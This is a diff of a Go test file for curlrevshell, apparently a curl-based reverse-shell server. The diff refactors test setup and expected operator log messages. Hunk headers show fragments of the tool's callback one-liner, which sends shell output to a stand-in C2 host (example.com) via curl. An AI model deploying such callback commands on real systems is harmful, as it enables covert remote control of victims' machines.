@@ -12,8 +12,6 @@ import (
 	"bytes"
 	"context"
 	"fmt"
-	"io"
-	"log/slog"
 	"net"
 	"net/http"
 	"net/http/httptest"
@@ -21,13 +19,11 @@ import (
 	"path/filepath"
 	"regexp"
 	"strings"
-	"sync"
 	"testing"
 
 	"github.com/magisterquis/curlrevshell/internal/iobroker"
-	"github.com/magisterquis/curlrevshell/lib/chanlog"
+	"github.com/magisterquis/curlrevshell/internal/tlog"
 	"github.com/magisterquis/curlrevshell/lib/crstemplate"
-	"github.com/magisterquis/curlrevshell/lib/ctxerrgroup"
 	"github.com/magisterquis/curlrevshell/lib/opshell"
 )
 
@@ -43,7 +39,7 @@ func localAddrContext(s *Server) context.Context {
 
 // make sure we can get a context with the server's local address.
 func TestLocalAddrContext(t *testing.T) {
-	_, _, _, s, _ := newTestServer(t)
+	_, _, _, _, _, s := newTestServer(t.Context(), t, nil)
 	sa := s.l.Addr()
 	v := localAddrContext(s).Value(http.LocalAddrContextKey)
 	ca, ok := v.(net.Addr)
@@ -76,7 +72,7 @@ func TestLocalAddrContext(t *testing.T) {
 }
 
 func TestServerScriptHandler_NonDefaultPort(t *testing.T) {
-	cl, _, och, s, _ := newTestServer(t)
+	_, _, och, _, _, s := newTestServer(t.Context(), t, nil)
 	rr := httptest.NewRecorder()
 	rr.Body = new(bytes.Buffer)
 	s.scriptHandler(rr, httptest.NewRequestWithContext(
@@ -98,7 +94,7 @@ func TestServerScriptHandler_NonDefaultPort(t *testing.T) {
 	id := ms[1]
 	gotLog.Line = strings.ReplaceAll(gotLog.Line, id, "IDID")
 	wantLog := opshell.CLine{
-		Color: ScriptColor,
+		Color: scriptColor,
 		Line: "[192.0.2.1] Sent script: ID:IDID " +
 			"C2Addr:example.com:1234 Path:/c",
 	}
@@ -130,11 +126,10 @@ curl -sk --pinnedpubkey sha256//xxx= https://example.com:1234/o/IDID -T- >/dev/n
 			wantBody,
 		)
 	}
-	cl.ExpectEmpty(t)
 }
 
 func TestServerScriptHandler(t *testing.T) {
-	cl, _, och, s, _ := newTestServer(t)
+	_, _, och, _, _, s := newTestServer(t.Context(), t, nil)
 	rr := httptest.NewRecorder()
 	rr.Body = new(bytes.Buffer)
 	s.scriptHandler(rr, httptest.NewRequestWithContext(
@@ -156,7 +151,7 @@ func TestServerScriptHandler(t *testing.T) {
 	id := ms[1]
 	gotLog.Line = strings.ReplaceAll(gotLog.Line, id, "IDID")
 	wantLog := opshell.CLine{
-		Color: ScriptColor,
+		Color: scriptColor,
 		Line: "[192.0.2.1] Sent script: ID:IDID " +
 			"C2Addr:example.com:443 Path:/c",
 	}
@@ -188,28 +183,26 @@ curl -sk --pinnedpubkey sha256//xxx= https://example.com/o/IDID -T- >/dev/null 2
 			wantBody,
 		)
 	}
-	cl.ExpectEmpty(t)
 }
 
 // Make sure we get the right Path, for complicated /c templates.
 func TestServerScriptHandler_Path(t *testing.T) {
 	/* Make a server with a script template which just returns the path. */
-	cl, _, _, s, _ := newTestServer(t)
-	defer cl.ExpectEmpty(t)
+	_, _, och, _, _, s := newTestServer(t.Context(), t, nil)
 	s.tmplf = filepath.Join(t.TempDir(), "kittens.tmpl")
 	if err := os.WriteFile(
 		s.tmplf,
 		[]byte(`
-{{ define "script" -}}
-{{- if eq "/c/one" .Request.URL.Path -}}
-	one
-{{- else if eq "/c/two" .Request.URL.Path -}}
-	two
-{{- else -}}
-	{{.Request.URL.Path}}
-{{- end -}}
-{{ end }}
-`),
+ {{ define "script" -}}
+ {{.ID}}|{{- if eq "/c/one" .Request.URL.Path -}}
+ 	one
+ {{- else if eq "/c/two" .Request.URL.Path -}}
+ 	two
+ {{- else -}}
+ 	{{.Request.URL.Path}}
+ {{- end -}}
+ {{ end }}
+ `),
 		0600,
 	); nil != err {
 		t.Fatalf("Error writing template: %s", err)
@@ -245,21 +238,26 @@ func TestServerScriptHandler_Path(t *testing.T) {
 		want: "two",
 	}} {
 		t.Run(c.have, func(t *testing.T) {
-			rr := httptest.NewRecorder()
-			rr.Body = new(bytes.Buffer)
-			s.scriptHandler(
-				rr,
-				httptest.NewRequestWithContext(
+			var (
+				rr  = httptest.NewRecorder()
+				req = httptest.NewRequestWithContext(
 					localAddrContext(s),
 					http.MethodGet,
 					c.have,
 					nil,
-				),
+				)
 			)
+			rr.Body = new(bytes.Buffer)
+			s.scriptHandler(rr, req)
 			if http.StatusOK != rr.Code {
 				t.Errorf("Non-OK Code %d", rr.Code)
 			}
-			if got := rr.Body.String(); got != c.want {
+			/* Get the ID and the template output from the body. */
+			id, tout, ok := strings.Cut(rr.Body.String(), "|")
+			if !ok {
+				t.Errorf("Did not find | in body")
+			}
+			if got := tout; got != c.want {
 				t.Errorf(
 					"Path incorrect:\n"+
 						"have: %q\n"+
@@ -270,37 +268,71 @@ func TestServerScriptHandler_Path(t *testing.T) {
 					c.want,
 				)
 			}
+			/* Does the user see the script was sent? */
+			path, _, _ := strings.Cut(c.have, "?")
+			opshell.ExpectShellMessages(t, och, testReqCLine(
+				t,
+				scriptColor,
+				req,
+				"Sent script: "+
+					"ID:%s "+
+					"C2Addr:example.com:443 "+
+					"Path:%s",
+				id,
+				path,
+			))
 		})
 	}
 }
 
 // Make sure changing and deleting a template file works.
 func TestServerScriptHandler_FromFile(t *testing.T) {
-	cl, _, _, s, _ := newTestServer(t)
-	fn := filepath.Join(t.TempDir(), "kittens.tmpl")
+	var (
+		tb, _, och, _, _, s = newTestServer(t.Context(), t, nil)
+		fn                  = filepath.Join(t.TempDir(), "kittens.tmpl")
+		id                  = tlog.S("id")
+	)
+	s.params.ID = id /* ID for all templates. */
 	s.tmplf = fn
 
-	var want string
 	const wantDefault = "WANT_DEFAULT"
+	var (
+		want                     string
+		wantCLineError           string
+		wantCLines               = make([]opshell.CLine, 1, 2)
+		wantRecommendSubtemplate bool
+	)
 
-	/* f Makes a request to scriptHandler and barfs if the response code
-	isn't correct.  The response body is checked against the variable
+	/* f Makes a request to scriptHandler and logs an error if the response
+	code isn't correct.  The response body is checked against the variable
 	want, declared above, unless want is wantDefault, in which case
-	checkDefaultCallbackScript is used. */
+	checkDefaultCallbackScript is used.
+
+	Similarly, if wantCLineError is set, it will be taken as an error
+	to be expected from och, and if wantRecommendSubtemplate is set,
+	a recommendation about template changes will be expected.  Both will
+	be reset before f returns. */
 	f := func(t *testing.T, expResCode int) {
 		t.Helper()
+		/* Reset the temporary variables when we're done. */
+		defer func() {
+			want = ""
+			wantCLineError = ""
+			wantCLines = wantCLines[:1]
+			wantRecommendSubtemplate = false
+		}()
 		/* Write the template to a file. */
-		rr := httptest.NewRecorder()
-		rr.Body = new(bytes.Buffer)
-		s.scriptHandler(
-			rr,
-			httptest.NewRequestWithContext(
+		var (
+			rr  = httptest.NewRecorder()
+			req = httptest.NewRequestWithContext(
 				localAddrContext(s),
 				http.MethodGet,
 				"/c",
 				nil,
-			),
+			)
 		)
+		rr.Body = new(bytes.Buffer)
+		s.scriptHandler(rr, req)
 		if expResCode != rr.Code {
 			t.Errorf(
 				"Incorrect response code\n got:%d\nwant:%d",
@@ -317,7 +349,32 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 				want,
 			)
 		}
-		cl.ExpectEmpty(t)
+		if err := wantCLineError; "" != err {
+			wantCLines[0] = testReqCLine(
+				t,
+				errorColor,
+				req,
+				"Failed to execute script template: %s",
+				err,
+			)
+		} else {
+			wantCLines[0] = testReqCLine(
+				t,
+				scriptColor,
+				req,
+				"Sent script: ID:%s C2Addr:example.com:443 "+
+					"Path:/c",
+				id,
+			)
+		}
+		if wantRecommendSubtemplate {
+			wantCLines = append(wantCLines, opshell.CLine{
+				Color: errorColor,
+				Line:  noSubtemplateWarning,
+			})
+		}
+		opshell.ExpectShellMessages(t, och, wantCLines...)
+		tb.Expect(t.Context(), t)
 	}
 
 	/* Test a custom template file with a script (i.e. normal)
@@ -392,6 +449,8 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 			t.Fatalf("Error removing %s: %s", fn, err)
 		}
 		want = ""
+		wantCLineError = "adding custom templates: reading template: " +
+			"open " + fn + ": no such file or directory"
 		f(t, http.StatusInternalServerError)
 	})
 
@@ -405,6 +464,8 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 			t.Fatalf("Error writing template to %s: %s", fn, err)
 		}
 		want = ""
+		wantCLineError = "adding custom templates: no subtemplates"
+		wantRecommendSubtemplate = true
 		f(t, http.StatusInternalServerError)
 	})
 
@@ -426,21 +487,20 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 // Make sure we can set the script URL in the output.
 func TestServer_SetScriptURLPath(t *testing.T) {
 	var (
-		_, sl = chanlog.New()
+		_, sl = tlog.NewBuffer()
+		och   = make(chan opshell.CLine, bufLen)
 		want  = "kittens"
+		iob   = iobroker.New(och)
 	)
 	s, err := New(
 		sl,
 		"127.0.0.1:0",
-		"",
-		nil,
-		nil,
-		nil,
-		"",
-		nil,
-		false,
-		true,
-		false,
+		"", /* tmplf */
+		iob,
+		"",    /* certFile */
+		nil,   /* cbAddrs */
+		false, /* printIPv6 */
+		true,  /* printDebug */
 		crstemplate.Params{
 			URLPaths: crstemplate.URLPaths{
 				Script: want,
@@ -486,7 +546,7 @@ func TestServer_IncorrectSubtemplates(t *testing.T) {
 	/* Make a non-subtemplate template file. */
 	var (
 		tmplf = filepath.Join(t.TempDir(), "tmpl")
-		have  = "kittens"
+		have  = tlog.S("kittens")
 	)
 	if err := os.WriteFile(tmplf, []byte(have), 0600); nil != err {
 		t.Fatalf(
@@ -497,68 +557,26 @@ func TestServer_IncorrectSubtemplates(t *testing.T) {
 		)
 	}
 
-	/* Start a server. */
-	var (
-		ich = make(chan string, 1024)
-		och = make(chan opshell.CLine, 1024)
-	)
-	iob, err := iobroker.New(ich, och)
-	if nil != err {
-		t.Fatalf("Error setting up IO Broker: %s", err)
-	}
-	s, err := New(
-		slog.New(slog.NewJSONHandler(io.Discard, nil)),
-		"127.0.0.1:0",
-		tmplf,
-		ich,
-		och,
-		iob,
-		"",
-		nil,
-		false,
-		false,
-		true,
-		crstemplate.Params{},
-	)
-	if nil != err {
-		t.Fatalf("Error starting server: %s", err)
-	}
-
-	/* Start everything going. */
-	ctx, cancel := context.WithCancelCause(context.Background())
-	eg, ectx := ctxerrgroup.WithContext(ctx)
-	eg.GoContext(ectx, s.Do)
-	eg.GoContext(ectx, iob.Do)
-
-	/* Function to shut down the server. */
-	shutdown := sync.OnceFunc(func() {
-		/* Tell everything to stop. */
-		cancel(errTestEnding)
-		if err := eg.Wait(); nil != err {
-			t.Fatalf("Unexpected server error: %s", err)
-		}
-		close(och)
-		close(ich)
+	/* Start the server with the non-subtemplate template file. */
+	_, _, och, _, _, s := newTestServer(t.Context(), t, &testServerConfig{
+		tmplf:      tmplf,
+		registerHM: true,
 	})
-	t.Cleanup(shutdown) /* For just in case. */
 
 	/* Make sure we get a warning about templates. */
-	wantCLines := []opshell.CLine{{
-		Line: fmt.Sprintf("Listening on %s", s.l.Addr()),
-	}, {
+	opshell.ExpectShellMessages(t, och, []opshell.CLine{{
 		Color: opshell.ColorRed,
 		Line: fmt.Sprintf(
 			"Error generating callback one-liners: "+
 				"executing callback subtemplate for %s: "+
-				"adding custom templates: no subtemplates",
-			s.l.Addr(),
+				"adding custom templates: no subtemplates\n"+
+				noSubtemplateWarning,
+			s.lAddrs[0],
 		),
 	}, {
-		Color: opshell.ColorRed,
-		Line:  noSubtemplateWarning,
-	}}
-	opshell.ExpectShellMessages(t, och, wantCLines...)
-	opshell.ExpectNoShellMessages(t, och, shutdown)
+		Line:  "\n",
+		Plain: true,
+	}}...)
 }
 
 // checkDefaultCallbackScript checks to see if got looks like the default
